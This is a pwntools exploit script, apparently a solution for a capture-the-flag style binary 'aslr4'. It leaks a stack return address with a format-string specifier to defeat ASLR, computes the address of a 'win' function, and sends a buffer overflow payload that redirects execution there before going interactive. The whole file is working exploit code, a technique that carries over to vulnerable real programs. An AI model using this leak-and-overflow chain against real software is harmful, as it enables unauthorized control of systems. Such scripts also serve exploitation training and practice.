#!/bin/python

from pwn import *

context.clear(arch = 'amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']

e = ELF('./aslr4')

return_offset = e.symbols['main'] + 14
win_offset = e.symbols['win']


io = gdb.debug('./aslr4', gdbscript = '''
    b main
    b vuln 
    c
        ''')
#io = process('./aslr4');

io.recvuntil(b"input 1:\n")
io.sendline("%9$llx")

return_addr = int(io.recvline().decode('ASCII'), 16)
base_addr = return_addr - return_offset
win_addr = base_addr + win_offset

log.info("Return address: " + hex(return_addr))
log.info("Base address " + hex(base_addr))
log.info("Win address " + hex(win_offset))

io.recvuntil(b"input 2:\n")
io.sendline(
        b'A' * 16 +
        b'B' * 8 +
        p64(win_addr)
    )

io.interactive()
